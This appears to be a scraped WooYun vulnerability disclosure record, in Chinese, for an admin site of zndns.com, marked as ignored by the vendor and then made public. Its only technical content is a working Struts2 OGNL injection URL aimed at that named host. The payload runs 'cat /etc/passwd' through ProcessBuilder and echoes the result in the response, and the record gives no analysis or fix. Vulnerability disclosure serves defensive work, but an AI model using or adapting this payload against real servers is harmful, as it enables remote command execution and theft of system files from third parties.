wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-11-13：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-12-28：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  http://admin.zndns.com/userAction!login.do?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}   漏洞证明：
